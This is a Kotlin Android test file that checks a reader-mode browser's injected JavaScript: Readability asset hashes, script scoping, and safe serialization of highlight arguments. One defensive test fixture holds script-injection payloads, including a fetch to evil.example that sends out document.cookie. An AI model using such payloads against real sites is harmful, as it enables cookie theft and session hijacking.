package com.dantech.skimbrowser.browser.page

import android.content.Context
import android.content.res.AssetManager
import androidx.test.core.app.ApplicationProvider
import androidx.test.ext.junit.runners.AndroidJUnit4
import java.io.InputStream
import java.security.MessageDigest
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertSame
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith

@RunWith(AndroidJUnit4::class)
class PageScriptsTest {

    private val assets: AssetManager = ApplicationProvider.getApplicationContext<Context>().assets
    private val scripts = PageScripts(assets)

    @Test
    fun aWebViewRunsThePageScriptsFromChromium80On() {
        assertFalse(PageScripts.runsOn("66.0.3359.158"))
        assertFalse(PageScripts.runsOn("79.0.3945.116"))
        assertTrue(PageScripts.runsOn("80.0.3987.87"))
        assertTrue(PageScripts.runsOn("133.0.6943.137"))
        assertTrue(PageScripts.runsOn(" 100 "))
        assertFalse("no version, no scripts", PageScripts.runsOn(null))
        assertFalse(PageScripts.runsOn(""))
        assertFalse(PageScripts.runsOn("beta-133"))
    }

    @Test
    fun theScriptsAskOnceWhetherTheWebViewRunsThemAndOnlyWhenAsked() {
        var asked = 0
        val asking = PageScripts(assets) { asked++ >= 0 && false }
        assertEquals("not asked before it is needed", 0, asked)

        assertFalse(asking.isSupported)
        assertFalse(asking.isSupported)

        assertEquals(1, asked)
        assertTrue("without a check the scripts are taken to run", scripts.isSupported)
    }

    @Test
    fun readabilityIsTheReleasedPackageUnchanged() {
        // From the npm tarball of @mozilla/readability 0.6.0, checked against its dist.integrity.
        assertEquals(READABILITY_SHA256, sha256("js/readability/Readability.js"))
        assertEquals(READERABLE_SHA256, sha256("js/readability/Readability-readerable.js"))
        assertEquals(LICENSE_SHA256, sha256("js/readability/LICENSE.md"))
        assertTrue(text("js/readability/LICENSE.md").contains("Apache License, Version 2.0"))
    }

    @Test
    fun theExtractScriptRunsReadabilityAndTheExtractorInOneFunctionScope() {
        val script = scripts.extractScript()
        val readerable = text("js/readability/Readability-readerable.js").trimEnd()
        val readability = text("js/readability/Readability.js").trimEnd()
        val extractor = text("js/skim-extract.js").trimEnd()

        assertTrue(script.startsWith("(function () {\nvar module;\n"))
        assertTrue(script.endsWith("\n);\n})()"))
        val readerableAt = script.indexOf(readerable)
        val readabilityAt = script.indexOf(readability)
        val extractorAt = script.indexOf("return (\n$extractor\n);")
        assertTrue("the readerable check first", readerableAt > 0)
        assertTrue("then Readability", readabilityAt > readerableAt)
        assertTrue("then the extractor, whose value the script returns", extractorAt > readabilityAt)
        assertEquals("each declaration only once, inside the scope", 1, occurrences(script, "function Readability(doc, options)"))
        assertEquals(1, occurrences(script, "function isProbablyReaderable(doc, options = {})"))
    }

    @Test
    fun theReaderableScriptLeavesReadabilityItselfOut() {
        val script = scripts.readerableScript()

        assertTrue(script.startsWith("(function () {\nvar module;\n"))
        assertTrue(script.contains(text("js/readability/Readability-readerable.js").trimEnd()))
        assertFalse(script.contains("function Readability(doc, options)"))
        assertTrue(script.contains("return (\n" + text("js/skim-readerable.js").trimEnd() + "\n);"))
        assertTrue(script.endsWith("})()"))
    }

    @Test
    fun theHighlightScriptCallsTheFunctionWithTheJsonAsItsOnlyArgument() {
        val hostile = HighlightRequest(
            expectedUrl = "https://evil.example/\"});alert(1);//",
            expectedNonce = 7,
            blockId = "12",
            citedText = "`);fetch('//evil.example/'+document.cookie)//</script>\${x}",
        )
        val args = highlightArgsJson(hostile)!!

        val script = scripts.highlightScript(args)

        val function = text("js/skim-highlight.js").trimEnd()
        assertEquals("($function)($args)", script)
        assertEquals("the argument appears once, at the end", 1, occurrences(script, args))
        val parsed = Json.parseToJsonElement(args).jsonObject
        assertEquals(hostile.citedText, parsed.getValue("cited").jsonPrimitive.content)
        assertEquals(hostile.expectedUrl, parsed.getValue("url").jsonPrimitive.content)
    }

    @Test
    fun theHighlightFunctionComparesIdsAsValuesAndChecksThePageFirst() {
        val function = text("js/skim-highlight.js")

        assertTrue("one function of one argument", function.lines().first { !it.startsWith("//") }.startsWith("function (args) {"))
        assertTrue("every block is read and its id compared", function.contains("document.querySelectorAll(ID_SELECTOR)"))
        assertTrue(function.contains("getAttribute(ID) === args.id"))
        assertFalse("no id ever becomes part of a selector", function.contains("+ args.id") || function.contains("args.id +"))
        val pageCheck = function.indexOf("withoutFragment(String(location.href)) !== withoutFragment(args.url)")
        assertTrue(pageCheck > 0)
        assertTrue("the page is checked before anything is read", pageCheck < function.indexOf("document.querySelectorAll"))
    }

    @Test
    fun eachAssetIsReadOnce() {
        val opened = mutableListOf<String>()
        val counting = PageScripts(
            open = { path ->
                opened += path
                assets.open(path)
            },
        )

        repeat(3) {
            counting.extractScript()
            counting.readerableScript()
            counting.highlightScript("{}")
        }

        assertEquals(opened.distinct(), opened)
        assertEquals(
            setOf(
                "js/readability/Readability.js",
                "js/readability/Readability-readerable.js",
                "js/skim-extract.js",
                "js/skim-readerable.js",
                "js/skim-highlight.js",
            ),
            opened.toSet(),
        )
        assertSame(counting.extractScript(), counting.extractScript())
    }

    @Test
    fun skimsScriptsDeclareNothingOutsideTheirFunctions() {
        listOf("js/skim-extract.js", "js/skim-readerable.js", "js/skim-highlight.js").forEach { path ->
            val code = text(path).lines().filterNot { it.startsWith("//") }.joinToString("\n").trim()

            assertTrue("$path is one function", code.startsWith("(function () {") || code.startsWith("function (args) {"))
            assertTrue("$path runs strict, so a stray assignment throws instead of making a global", code.contains("'use strict';"))
            assertFalse("$path touches no global object", Regex("""\b(window|globalThis|self)\.\w+\s*=""").containsMatchIn(code))
            assertFalse(path, code.endsWith(";"))
        }
        assertTrue(text("js/skim-extract.js").trimEnd().endsWith("})()"))
        assertTrue(text("js/skim-readerable.js").trimEnd().endsWith("})()"))
        assertTrue(text("js/skim-highlight.js").trimEnd().endsWith("}"))
    }

    @Test
    fun skimsScriptsHoldOnlyAsciiCharacters() {
        // Invisible and bidi characters are written as escapes, so the source shows what it matches.
        listOf("js/skim-extract.js", "js/skim-readerable.js", "js/skim-highlight.js").forEach { path ->
            val bad = text(path).filter { it.code > 0x7E || (it.code < 0x20 && it != '\n') }
            assertEquals(path, "", bad)
        }
    }

    @Test
    fun theExtractorKeepsTheLimitsTheAppReads() {
        val extractor = text("js/skim-extract.js")

        assertTrue(extractor.contains("var MAX_BLOCKS = $MAX_BLOCKS;"))
        assertTrue(extractor.contains("var MAX_CHARS = $MAX_TEXT_CHARS;"))
        assertTrue("the same block selector the app documents", extractor.contains("'p,li,h1,h2,h3,h4,h5,h6,blockquote,pre,figcaption'"))
    }

    private fun text(path: String): String = assets.open(path).use { it.readBytes().toString(Charsets.UTF_8) }

    private fun sha256(path: String): String = assets.open(path).use { stream: InputStream ->
        MessageDigest.getInstance("SHA-256").digest(stream.readBytes()).joinToString("") { "%02x".format(it) }
    }

    private fun occurrences(text: String, part: String): Int {
        var count = 0
        var at = text.indexOf(part)
        while (at >= 0) {
            count++
            at = text.indexOf(part, at + 1)
        }
        return count
    }

    private companion object {
        const val READABILITY_SHA256 = "34dcab3d0832d0019f02990eed6b6124e029e8c32b9f0c6f2550544ff8dff174"
        const val READERABLE_SHA256 = "a98d28805804c1986ceed470678a3f409f150ee7f1d227f8c8239c005d21de65"
        const val LICENSE_SHA256 = "a5b1e8181751ce05b85b7bfaa832b785e87086250a5148e679d17ca9bdcfa958"
    }
}
